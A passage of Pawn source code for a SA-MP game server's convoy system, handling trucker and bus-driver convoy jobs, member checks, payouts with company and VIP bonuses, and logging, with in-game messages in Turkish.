			MemberID = AConvoys[Convoy][Members][j];
			if (MemberID != -1) // If a valid playerid is found
			{
                // Set this member as leader
				AConvoys[Convoy][Members][0] = MemberID;
                // Clear this index, or the player would be twice in the same convoy
				AConvoys[Convoy][Members][j] = -1;
                // Exit the function
				return 1;
			}
		}
	}
	else // The leaving player isn't the leader
	{
		// Find the player inside the convoy
		for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
		{
			// If the current player is this player
			if (AConvoys[Convoy][Members][i] == playerid)
			{
			    // Reset the stored playerid in the convoy
			    AConvoys[Convoy][Members][i] = -1;
			    new ConvoyLeaderID = AConvoys[Convoy][Members][0];
			    new Msg[1024];
                format(Msg, 1024, "%s isimli kisinin konvoyundan ayrildi.", GetName(ConvoyLeaderID));
    			SqlLogYaz(playerid, 6, Msg);
			    
				// Stop the job for this player (all data gets cleared, including the missiontext)
				if(APlayerData[playerid][PlayerClass] == ClassTruckDriver) Trucker_EndJob(playerid);
				if(APlayerData[playerid][PlayerClass] == ClassBusDriver) BusDriver_EndJob(playerid);
				if(APlayerData[playerid][PlayerClass] == ClassDolmusDriver) DolmusDriver_EndJob(playerid);

				return 1; // Exit the function
			}
		}
	}

	return 1;
}

// This function cancels the convoy, kicking every member in it
Convoy_Cancel(Convoy)
{
	// Setup local variables
	new MemberID;

	// Loop through all members
	for (new i; i < CONVOY_MAX_MEMBERS; i++)
	{
		// Get the member's playerid
	    MemberID = AConvoys[Convoy][Members][i];
		// If a valid playerid is found
		if (MemberID != -1)
		{
			// Remove the player from the convoy
			APlayerData[MemberID][InConvoy] = false;
			APlayerData[MemberID][ConvoyID] = 0;
			ShowPlayerV5UI(MemberID);
			// Cancel the trucker-job
			if(APlayerData[MemberID][PlayerClass] == ClassTruckDriver) Trucker_EndJob(MemberID);
			if(APlayerData[MemberID][PlayerClass] == ClassBusDriver) BusDriver_EndJob(MemberID);
			if(APlayerData[MemberID][PlayerClass] == ClassDolmusDriver) DolmusDriver_EndJob(MemberID);
		    // Reset the stored playerid in the convoy
		    AConvoys[Convoy][Members][i] = -1;
			// Send the member a message that the convoy was cancelled by the leader
			SendClientMessage(MemberID, 0xFFFFFFFF, TXT_LeaderCancelledConvoy);
		}
	}

	// Clear all the data of the convoy
	AConvoys[Convoy][LoadID] = 0;
	AConvoys[Convoy][Location1] = 0;
	AConvoys[Convoy][Location2] = 0;
	AConvoys[Convoy][Status] = CONVOY_EMPTY;
	AConvoys[Convoy][ConvoyStep] = 0;
	AConvoys[Convoy][TrailerModel] = 0;
	AConvoys[Convoy][LeaderInformedTrailers] = false;
	AConvoys[Convoy][ConvoySifreli] = false;
	// Kill the convoy-timer
	KillTimer(AConvoys[Convoy][ConvoyTimer]);
}



// This function is called for every member when the leader of the convoy started a job (missiontext is updated, loading-checkpoint is created, ...
Convoy_StartMemberJob(playerid, Convoy)
{
    // Setup local variables
	new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, LoadMsg[128];

	// Job has started
	APlayerData[playerid][JobStarted] = true;
	// Copy the convoy-data to this player
	APlayerData[playerid][LoadID] = AConvoys[Convoy][LoadID];
	APlayerData[playerid][JobLoc1] = AConvoys[Convoy][Location1];
	APlayerData[playerid][JobLoc2] = AConvoys[Convoy][Location2];

	// Store the vehicleID (required to be able to check if the player left his vehicle)
	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);

	// Set jobstep to 1 (going to load the goods)
	APlayerData[playerid][JobStep] = 1;
	// Get the startlocation, endlocation and the load texts
	switch(APlayerData[playerid][PlayerClass])
	{
	    case ClassTruckDriver:
	    {
			// Store the trailerID (required to be able to check if the player lost his trailer)
			APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);
			// Grab the x, y, z positions for the first location
			x = ALocations[APlayerData[playerid][JobLoc1]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc1]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc1]][LocZ];
			// Create a checkpoint where the player should load the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
	    }

		case ClassBusDriver:
		{
			format(StartLoc, 50, BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, "Yolcu");
			// Grab the x, y, z positions for the first location
			x = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocX];
			y = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocY];
			z = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocZ];
			// Create a checkpoint where the player should load the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
		}
	}

	// Set the job-fail-time for the global vehicle-timer
	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;
	// Inform the player that he must load his goods
	format(LoadMsg, 128, TXT_PickupCargoAt, Load, StartLoc);
	SendClientMessage(playerid, 0xFFFFFFFF, LoadMsg);
	SendClientMessage(playerid, 0xFFFFFFFF, TXT_MeetOtherConvoyMembers);
	new Msg[1024];
	format(Msg, 1024, "Konvoy görevini baþlattý.");
    SqlLogYaz(playerid, 6, Msg);
}



// This function is called when all convoy-members have loaded their cargo (it updates the missiontext and creates the unload-checkpoint)
Convoy_UpdateMemberJob(playerid)
{
    // Setup local variables
	new StartLoc[50], EndLoc[50], Load[50], Float:x, Float:y, Float:z, UnloadMsg[128];

	// Set the jobstep to 3 (going to unload the cargo at the destination)
	APlayerData[playerid][JobStep] = 3;

	switch(APlayerData[playerid][PlayerClass])
	{
	    case ClassTruckDriver:
	    {
			// Store the trailerID (required to be able to check if the player lost his trailer)
			APlayerData[playerid][TrailerID] = GetVehicleTrailer(GetPlayerVehicleID(playerid));

			format(StartLoc, 50, ALocations[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, ALoads[APlayerData[playerid][LoadID]][LoadName]);
			// Grab the x, y, z positions for the first location
			x = ALocations[APlayerData[playerid][JobLoc2]][LocX];
			y = ALocations[APlayerData[playerid][JobLoc2]][LocY];
			z = ALocations[APlayerData[playerid][JobLoc2]][LocZ];
			// Create a checkpoint where the player should load the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
	    }

		case ClassBusDriver:
		{
			format(StartLoc, 50, BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName]);
			format(EndLoc, 50, BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName]);
			format(Load, 50, "Yolcu");
			// Grab the x, y, z positions for the first location
			x = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocX];
			y = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocY];
			z = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocZ];
			// Create a checkpoint where the player should load the goods
			SetPlayerCheckpoint(playerid, x, y, z, 7);
		}
	}

	// Inform the player that he must unload his goods
	format(UnloadMsg, 128, TXT_DeliverCargoTo, Load, EndLoc);
	SendClientMessage(playerid, 0xFFFFFFFF, UnloadMsg);
	new Msg[1024];
	format(Msg, 1024, "Konvoy yükünü aldý.");
    SqlLogYaz(playerid, 6, Msg);
}



// This is the timer used by every convoy (it updates and checks everything), is executed every 2.5 seconds
public Convoy_Timer(Convoy)
{
	// Setup local variables
	new LeaderID, MemberID, Yazi[256];

	// Update the textdraws for all convoy members
    Convoy_UpdateTextDraws(Convoy);
	// Get the leader-id
	LeaderID = AConvoys[Convoy][Members][0];

	if(VIP[LeaderID] == 0)
	{
		AConvoys[Convoy][ConvoySifreli] = false;
	}

    // Check the jobstep for the entire convoy
	switch (AConvoys[Convoy][ConvoyStep])
	{
		case 0: // Convoy has just been created, but a job hasn't started yet by the leader
		{
			new bool:AllSameTrailer = true;

			// Keep checking if the leader has started a job already
			if (APlayerData[LeaderID][JobStarted] == true)
			{
				// Copy the job-data from the leader to the convoy
				AConvoys[Convoy][LoadID] = APlayerData[LeaderID][LoadID];
				AConvoys[Convoy][Location1] = APlayerData[LeaderID][JobLoc1];
				AConvoys[Convoy][Location2] = APlayerData[LeaderID][JobLoc2];
				// Set the trailer-model required by all members to the convoy
				AConvoys[Convoy][TrailerModel] = GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(LeaderID)));

				// First check if the leader has a trailer attached or not
				if (AConvoys[Convoy][TrailerModel] != 0)
				{
					// First check if all players have the correct trailer (except for the leader)
					for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
					{
						MemberID = AConvoys[Convoy][Members][i]; // Get the member-id from this member-spot
						if (MemberID != -1) // Check if the member-id is a valid playerid
						{
						    if(APlayerData[MemberID][PlayerClass] != APlayerData[LeaderID][PlayerClass])
						    {
						    	format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}sizle ayni meslekte degil.", GetName(MemberID));
							    if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);
							    AllSameTrailer = false;
						    }else if(GetPlayerState(MemberID) != PLAYER_STATE_DRIVER)
						    {
						    	format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}arabasýnda deðil.", GetName(MemberID));
							    if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);
							    AllSameTrailer = false;
						    }else if (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(MemberID))) != AConvoys[Convoy][TrailerModel]) // Check if the player has the same trailer-model attached to his vehicle as the convoy requires
							{
							    // Inform the player that he hasn't got the correct trailer
							    /*switch (AConvoys[Convoy][TrailerModel])
							    {
									case VehicleTrailerCargo, VehicleTrailerCargo2: TextDrawSetString(APlayerData[MemberID][MissionText], TXT_MemberNeedsCargoTrailer);
									case VehicleTrailerOre: TextDrawSetString(APlayerData[MemberID][MissionText], TXT_MemberNeedsOreTrailer);
									case VehicleTrailerFluids: TextDrawSetString(APlayerData[MemberID][MissionText], TXT_MemberNeedsFluidsTrailer);
								}*/
								// Not everyone has the same trailer
								AllSameTrailer = false;

								format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}sizle ayný kasayý almamýþ.", GetName(MemberID));
				    			if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);
							}
						}
					}
				}
				else // Leader has no trailer attached, so check for the vehiclemodel
				{
					// First check if all players have the correct trailer (except for the leader)
					for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
					{
						MemberID = AConvoys[Convoy][Members][i]; // Get the member-id from this member-spot
						if (MemberID != -1) // Check if the member-id is a valid playerid
						{
						    if(APlayerData[MemberID][PlayerClass] != APlayerData[LeaderID][PlayerClass])
						    {
						    	format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}sizle ayni meslekte degil.", GetName(MemberID));
							    if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);
							    AllSameTrailer = false;
						    }else if(GetPlayerState(MemberID) != PLAYER_STATE_DRIVER)
						    {
					    		format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}arabasýnda deðil.", GetName(MemberID));
							    if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);
							    AllSameTrailer = false;
							}else{
						    	// Get the vehiclemodel of the member
						    	new vModel = GetVehicleModel(GetPlayerVehicleID(MemberID));
						    	// Check if the member has a valid trucking vehicle (flatbed or DFT30)
								switch (vModel)
								{
									case VehicleFlatbed, VehicleDFT30, VehicleCoach: AllSameTrailer = true;
									default:
									{
								    	format(Yazi, 256, "{54FF9F}«KONVOY» {F8F8FF}Konvoy üyeniz {FF0000}%s {F8F8FF}sizle ayný aracý almamýþ.", GetName(MemberID));
								    	if(AConvoys[Convoy][LeaderInformedTrailers] == false) SendClientMessage(LeaderID, -1, Yazi);

										//TextDrawSetString(APlayerData[MemberID][MissionText], "Flatbed veya DFT-30 almanýz gerekiyor");
										AllSameTrailer = false;
									}
								}
							}
						}
					}
				}

				// If all members have the same trailer
				if (AllSameTrailer == true)
				{
					// Inform the leader that everyone has the same trailer
					SendClientMessage(LeaderID, 0xFFFFFFFF, TXT_AllMembersSameTrailer);

					// Start the same job for every member if they all have the same trailer
					for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
					{
						MemberID = AConvoys[Convoy][Members][i]; // Get the member-id from this member-spot
						if (MemberID != -1) // Check if the member-id is a valid playerid
							Convoy_StartMemberJob(MemberID, Convoy); // Start the job for the member
					}

					// Select the next step for the convoy (all members are now en-route to the loading-point)
	                AConvoys[Convoy][ConvoyStep] = 1;
					// Also close the convoy so no more members can join
				    AConvoys[Convoy][Status] = CONVOY_CLOSED;
				}
				else
				{
				    // Check if the leader has been informed already that not all members have the same trailer
					if (AConvoys[Convoy][LeaderInformedTrailers] == false)
					{
						// Inform the leader that not every member has the same trailer, convoy cannot start yet
						SendClientMessage(LeaderID, 0xFFFFFFFF, TXT_AllMembersNotSameTrailer);
						SendClientMessage(LeaderID, 0xFFFFFFFF, "Konvoy üyelerinize sizinle ayný aracý almalarýný veya ayni meslekte olmalarini söyleyin.");
						SendClientMessage(LeaderID, 0xFFFFFFFF, "Almayanlarý tekrar /convoybilgi yazarak öðrenebilirsiniz.");
						AConvoys[Convoy][LeaderInformedTrailers] = true; // Leader is informed now
					}
				}
			}
		}
		case 1: // Everyone has received their job-data (but haven't loaded their cargo yet)
		{
			new bool:AllMembersLoaded = true;

			// Check if everyone has loaded their cargo before moving on to convoystep 2
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
				MemberID = AConvoys[Convoy][Members][i]; // Get the playerid of the member
				if (MemberID != -1) // Check if the memberid is a valid id
					if (APlayerData[MemberID][JobStep] != 2) // Check if the player hasn't loaded his cargo yet
					    AllMembersLoaded = false; // Not all members have loaded their cargo yet
			}

			// Check if everyone has loaded their cargo
			if (AllMembersLoaded == true)
			{

				// Inform the leader that everyone has the same trailer
				SendClientMessage(LeaderID, 0xFFFFFFFF, TXT_AllMembersLoadedCargo);

				// Update the job for every member if they all have loaded their cargo
				for (new i; i < CONVOY_MAX_MEMBERS; i++)
				{
					MemberID = AConvoys[Convoy][Members][i]; // Get the member-id from this member-spot
					if (MemberID != -1) // Check if the member-id is a valid playerid
						Convoy_UpdateMemberJob(MemberID); // Start the job for the member
				}
				// Select the next step for the convoy (all members are now en-route to the unloading-point)
                AConvoys[Convoy][ConvoyStep] = 2;
			}
		}
		case 2: // Everybody has loaded their cargo and all members have their job updated, all members are en-route to the destination
		{
			// Check if everyone is staying close to the leader and check if all members have unloaded their cargo
			new bool:AllMembersUnloaded = true;

			// Also check if all players have delivered their load
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
				MemberID = AConvoys[Convoy][Members][i]; // Get the playerid of the member
				if (MemberID != -1) // Check if the memberid is a valid id
					if (APlayerData[MemberID][JobStep] != 4) // Check if the player hasn't unloaded his cargo yet
					    AllMembersUnloaded = false; // Not all members have unloaded their cargo yet
			}

			if (AllMembersUnloaded == true) // Check if all members have unloaded their cargo (nobody cleared this variable)
				AConvoys[Convoy][ConvoyStep] = 3; // Set the jobstep for the entire convoy to 3 (everybody unloaded their cargo, but jobs must still be payed out)
		}
		case 3: // Everybody has unloaded their cargo (now it's time to pay all members and finish the job)
		{
		    // Setup local variables
			new Float:x1, Float:y1, Float:x2, Float:y2, Float:Distance, /*Message[128],*/ Payment, Bonus, NumMembers, Name[24], BonusMsg[128];

			// Count the number of members in the convoy
			NumMembers = Convoy_CountMembers(Convoy);

			// Get the name of the convoy-leader
			GetPlayerName(LeaderID, Name, sizeof(Name));

			switch(APlayerData[LeaderID][PlayerClass])
			{
			    case ClassTruckDriver:
			    {
					// Grab the x, y, z positions for the first location (to load the goods)
					x1 = ALocations[APlayerData[LeaderID][JobLoc1]][LocX];
					y1 = ALocations[APlayerData[LeaderID][JobLoc1]][LocY];
					// Grab the x, y, z positions for the second location (to unload the goods)
					x2 = ALocations[APlayerData[LeaderID][JobLoc2]][LocX];
					y2 = ALocations[APlayerData[LeaderID][JobLoc2]][LocY];
			    }

			    case ClassBusDriver:
			    {
					// Grab the x, y, z positions for the first location (to load the goods)
					x1 = BusDriverMissionLoc[APlayerData[LeaderID][JobLoc1]][LocX];
					y1 = BusDriverMissionLoc[APlayerData[LeaderID][JobLoc1]][LocY];
					// Grab the x, y, z positions for the second location (to unload the goods)
					x2 = BusDriverMissionLoc[APlayerData[LeaderID][JobLoc2]][LocX];
					y2 = BusDriverMissionLoc[APlayerData[LeaderID][JobLoc2]][LocY];
				}
			}

			// Calculate the distance between both points
			Distance = floatsqroot(((x2 - x1) * (x2 - x1)) + ((y2 - y1) * (y2 - y1)));

			switch(APlayerData[LeaderID][PlayerClass])
			{
			    case ClassTruckDriver:
			    {
					// Calculate the payment for the player
					Payment = floatround((Distance * ALoads[APlayerData[LeaderID][LoadID]][PayPerUnit]), floatround_floor);
			    }

			    case ClassBusDriver:
			    {
					// Calculate the payment for the player
					Payment = floatround((Distance * 2.8), floatround_floor);
				}
			}

			new DiaYazi[2000], SirketBonus;

			// Check if the convoy has done the bonus mission
			if (RandomBonusMission[MissionFinished] == false && APlayerData[LeaderID][PlayerClass] == ClassTruckDriver)
			{
				// Check all paramters (load, startlocation and end-location)
				if (RandomBonusMission[RandomLoad] == APlayerData[LeaderID][LoadID])
					if (RandomBonusMission[RandomStartLoc] == APlayerData[LeaderID][JobLoc1])
						if (RandomBonusMission[RandomEndLoc] == APlayerData[LeaderID][JobLoc2])
						{
						    Payment = floatround(Payment * 1.5); // Double the payment is the player was the first to do the bonus mission

							RandomBonusMission[MissionFinished] = true; // Only one player/convoy can do the bonus mission, a new one is chosen next
							format(BonusMsg, 128, "{FFBB00}%s{00BBFF}'in konvoyu bonus görevi tamamladý", Name);
							SendClientMessageToAll(0xFFFFFFFF, BonusMsg);
						}
			}

			format(Yazi, 256, "{54FF9F}«KONVOY» {FF0000}%s{F8F8FF}'in konvoyu bir görevi tamamladý", Name);
			SendClientMessageToAll(-1, Yazi);
			format(Yazi, 1024, "Konvoyu baþarýyla görevi bitirdi.");
    		SqlLogYaz(LeaderID, 6, Yazi);

		    // Calculate convoy-bonus (standard payment of 100% and 25% extra for each convoy-member)
		    Bonus = (NumMembers * 15) + 100; // For every member, 25% bonus is added to the payment, on top of the standard payment
			// Calculate total payment for each member
			Payment = floatround( Payment * Bonus * 0.01 );

			new PPayment[MAX_PLAYERS], VIPBonus;

			// Pay every member and finish their mission
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
				MemberID = AConvoys[Convoy][Members][i]; // Get the playerid of the member
				if (MemberID != -1) // Check if the memberid is a valid id
				{
   					SonGorev[MemberID][0] = APlayerData[LeaderID][JobLoc1];
					SonGorev[MemberID][1] = APlayerData[LeaderID][JobLoc2];

					PPayment[MemberID] = Payment;
 					format(DiaYazi, 2000, "{F8F8FF}Bir konvoy görevi tamamladýnýz.\n \n{F8F8FF}Normal Ücret: {00FF00}%d$\n", Payment);

				    // Þirket Sistemi
					if(Sirket[MemberID] != -1)
				 	{
			    		SirketBonus = floatround(Payment * 0.8);
			    		PPayment[MemberID] += SirketBonus;
						if(VIP[MemberID] == 1 || YVIP[MemberID] == 1) { VIPBonus = PPayment[MemberID] * 2; PPayment[MemberID] += VIPBonus; EXP[MemberID] = EXP[MemberID] + 2;}

						format(DiaYazi, 2000, "%s{F8F8FF}Þirket Bonusu: {00FF00}%d$\n \n", DiaYazi, SirketBonus);
						if(VIP[MemberID] == 1 || YVIP[MemberID] == 1) { format(DiaYazi, 2000, "%s{F8F8FF}VIP Bonusu: {00FF00}%d$\n \n", DiaYazi, VIPBonus); }
                       	format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan Para: {00FF00}%d$\n", DiaYazi, PPayment[MemberID]);
						format(DiaYazi, 2000, "%s{F8F8FF}Þirkete Giden: {00FF00}%d$ (%%%d)\n", DiaYazi, floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), Sirketler[ Sirket[MemberID] ][SirketOran]);
						format(DiaYazi, 2000, "%s{F8F8FF}Size Kalan: {00FF00}%d$ (%%%d)\n", DiaYazi, PPayment[MemberID]-floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), 100 - Sirketler[ Sirket[MemberID] ][SirketOran]);
		                format(DiaYazi, 2000, "%s{F8F8FF}Kazanýlan EXP\t{FFC000}5 EXP", DiaYazi);
		                EXP[MemberID] = EXP[MemberID] + 5;


			    		ShowPlayerDialog(MemberID, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Görev Tamamlandý", DiaYazi, "Kapat", "");

			    		if(NumMembers > 4)
						{
			    			if(VIP[MemberID] >= 1 || YVIP[MemberID] == 1)
			    			{
			    			    RewardPlayer(MemberID, PPayment[MemberID]-floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), 15);
			    			}else{
			    			    RewardPlayer(MemberID, PPayment[MemberID]-floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), 5);
			    			}
						}else{
			    			if(VIP[MemberID] >= 1 || YVIP[MemberID] == 1)
							{
								RewardPlayer(MemberID, PPayment[MemberID]-floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), 6);
							}else{
								RewardPlayer(MemberID, PPayment[MemberID]-floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 )), 2);
							}
						}


			    		Sirketler[ Sirket[MemberID] ][SirketKasa] += floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 ));
						SirketKatki[MemberID] += floatround(PPayment[MemberID] * (Sirketler[ Sirket[MemberID] ][SirketOran] * 0.01 ));
						Sirketler[ Sirket[MemberID] ][SirketNeedSave] = 1;
					}else{
			    		if(NumMembers > 4)
						{
							RewardPlayer(MemberID, 0, 5);
						}else{
							RewardPlayer(MemberID, 0, 2);
						}

						if(VIP[MemberID] == 1 || YVIP[MemberID] == 1)
						{
						    format(DiaYazi, 2000, "%s{F8F8FF}VIP Bonusu: {00FF00}%d$\n{F8F8FF}Toplam Kazanç: {00FF00}%d$\n{F8F8FF}Kazanýlan EXP\t{FFC000}2 EXP", DiaYazi, Payment * 2, Payment * 3);
			    			if(NumMembers > 4)
							{
								RewardPlayer(MemberID, Payment * 3, 10);
								EXP[MemberID] = EXP[MemberID] + 5;
							}else{
								RewardPlayer(MemberID, Payment * 3, 4);
								EXP[MemberID] = EXP[MemberID] + 5;
							}

						}else{
							RewardPlayer(MemberID, Payment, 0);
						}
						ShowPlayerDialog(MemberID, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Görev Tamamlandý", DiaYazi, "Kapat", "");
					}

					/* - Eski Kod -
					// Reward the player (give cash and points)
					RewardPlayer(MemberID, Payment, 5);
					*/

					// Increase the stats for completing a trucking job while in a convoy
					APlayerData[MemberID][StatsConvoyJobs]++;
					
					// Also save the data (in case the server crashes, progress would be lost)
					Oyuncu_Kaydet(MemberID);

					// End the member's job
					if(APlayerData[MemberID][PlayerClass] == ClassTruckDriver) Trucker_EndJob(MemberID);
					if(APlayerData[MemberID][PlayerClass] == ClassBusDriver) BusDriver_EndJob(MemberID);
					// Send a message to let the player know he finished his mission and got paid
					//format(Message, 128, TXT_FinishedConvoy, Payment);
					//SendClientMessage(MemberID, 0xFFFFFFFF, Message);
					// Also update the player's missiontext to inform the player that he must wait for the leader to start a job
					//if (i != 0) // Skip this if the current index is the leader (the leader doesn't have to wait for a new Job)
						//TextDrawSetString(APlayerData[MemberID][MissionText], TXT_WaitingLeaderJob);
				}
			}

			// Clear the data in the convoy
			AConvoys[Convoy][LoadID] = 0; // Clear the load-id
			AConvoys[Convoy][Location1] = 0; // Clear the loadingpoint id
			AConvoys[Convoy][Location2] = 0; // Clear the unloading point id
			AConvoys[Convoy][Status] = CONVOY_OPEN; // Set status to "open" again, so new members can join
			AConvoys[Convoy][ConvoyStep] = 0; // Set convoystep to 0 (wait for a new Job to be started by the leader)
			AConvoys[Convoy][TrailerModel] = 0; // Clear trailer model (the next job can be for another trailer)
			AConvoys[Convoy][LeaderInformedTrailers] = false; // Allow the leader to be informed again if not all members have the correct trailer
		}
	}

	return 1;
}



// This function is used to update the textdraws for the leader and all members (used by the convoy-timer)
Convoy_UpdateTextDraws(Convoy)
{
	// Setup local variables
	new LeaderID, MemberID, LeaderName[24], NumMembers, TextLeader[128], TextMember[128], LastMember[24], LastMemberID, Float:Distance;

	// Get the leader-id
	LeaderID = AConvoys[Convoy][Members][0];
	// Get the name of the convoy-leader
	GetPlayerName(LeaderID, LeaderName, sizeof(LeaderName));
	// Get the number of members of the convoy
	NumMembers = Convoy_CountMembers(Convoy);

	// Check if there members besides the leader
	if (NumMembers > 1)
	{
	    LastMemberID = Convoy_GetFurthestMember(Convoy); // Get the playerid of the member who is furthest away from the leader
		GetPlayerName(LastMemberID, LastMember, sizeof(LastMember)); // Get the name of the furthest member
		Distance = PlayerToPlayer(LeaderID, LastMemberID); // Get the distance to the last member
	}
	else // No other members are in the convoy yet
	{
		format(LastMember, 24, " - ");
		Distance = 0.0;
	}

	// Update the convoy-textdraw for the leader
	format(TextLeader, 128, TXT_LeaderInfoBar, NumMembers, LastMember, Distance);
	//TextDrawSetString(AConvoys[Convoy][ConvoyTextLeader], TextLeader);
	// Enable the convoy-textDraw for the leader
	//TextDrawShowForPlayer(LeaderID, AConvoys[Convoy][ConvoyTextLeader]);

	// Update the convoy-textdraw for every member
	for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
	{
		MemberID = AConvoys[Convoy][Members][i]; // Get the playerid of the member
		if (MemberID != -1) // Check if the memberid is a valid id
		{
			// Calculate the distance to the leader
			Distance = PlayerToPlayer(LeaderID, MemberID);
			// Update the textdraw for the members
			format(TextMember, 128, TXT_MemberInfoBar, LeaderName, Distance, NumMembers);
			//TextDrawSetString(AConvoys[Convoy][ConvoyTextMember], TextMember);
			//TextDrawShowForPlayer(MemberID, AConvoys[Convoy][ConvoyTextMember]);
		}
	}
}



// This function counts the members in the convoy
Convoy_CountMembers(Convoyd)
{
	// Setup local variables
	new NumMembers;

	// Loop through all members
	for (new i; i < CONVOY_MAX_MEMBERS; i++)
	{
		// Check if there is a valid member-id stored (playerid)
		if (AConvoys[Convoyd][Members][i] != -1)
		    NumMembers++; // Increase the number of members
	}

	// Return the number of members to the calling routine
	return NumMembers;
}



// This function checks the player and determines if he's a valid trucker who's able to create or join a convoy
Convoy_PlayerAllowed(playerid)
{
 // Make sure that the leader is a trucker
	if (APlayerData[playerid][PlayerClass] == ClassTruckDriver || APlayerData[playerid][PlayerClass] == ClassBusDriver)
 //if (APlayerData[playerid][PlayerClass] == ClassBusDriver)
	{
		// Check if the player isn't a member of a convoy already
		if (APlayerData[playerid][InConvoy] == false)
		{
			// Make sure that the player hasn't started a job
			if (APlayerData[playerid][JobStarted] == false)
				return true; // The player is allowed to create or join a convoy
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, TXT_CannotJoinJobStarted);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyAllreadyJoined);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyNeedsTruckerClass);

	// If any condition wasn't true, the player isn't allowed to create or join a convoy
	return false;
}

// This function sends the given message to all members of the convoy
Convoy_SendMessage(Convoy, Message[])
{
	// Setup local variables
	new MemberID;

	// Loop through all members
	for (new i; i < CONVOY_MAX_MEMBERS; i++)
	{
	    MemberID = AConvoys[Convoy][Members][i]; // Get the member-id on this index
	    if (MemberID != -1) // Check if this member has a valid playerid
		{
			SendClientMessage(MemberID, 0xFFFFFFFF, Message); // Send the given message to the member
		}
	}
}

// This function returns "true" is the given player is the leader of the convoy
stock Convoy_IsLeader(playerid, Convoy)
{
	// Check if the player is part of a convoy
	if ((APlayerData[playerid][InConvoy] == true) && (AConvoys[Convoy][Members][0] = playerid))
	    return true; // Player is in a convoy AND he's the leader of it
	else
	    return false; // Player is a member of the convoy (or not in the same convoy)
}

// This function returns true if the player is a member of the given convoy
stock Convoy_IsMember(playerid, Convoy)
{
	// Loop through all members (excluding the leader)
	for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
	    if (AConvoys[Convoy][Members][i] == playerid) // Check if this member is the given player
			return true; // Return true (the player is a member of the convoy)

	// If the given playerid wasn't found among the members, return false
	return false;
}



// A function that returns the member of a convoy that's the furthest away from the leader
Convoy_GetFurthestMember(Convoy)
{
	// Setup local variables
	new Float:distance = 0.0, Float:distance2 = 0.0, LeaderID, MemberID, result = -1;

	// Get the leader-id
	LeaderID = AConvoys[Convoy][Members][0];

	// Loop through all members (excluding the leader)
	for(new i = 1; i < CONVOY_MAX_MEMBERS; i++)
	{
		MemberID = AConvoys[Convoy][Members][i]; // Get the playerid of the member
		if (MemberID != -1) // Check if the memberid is a valid id
		{
			// Get the distance between leader and member
			distance2 = PlayerToPlayer(LeaderID, MemberID);
			// Check if the distance is bigger than the previous distance
			if(distance2 > distance)
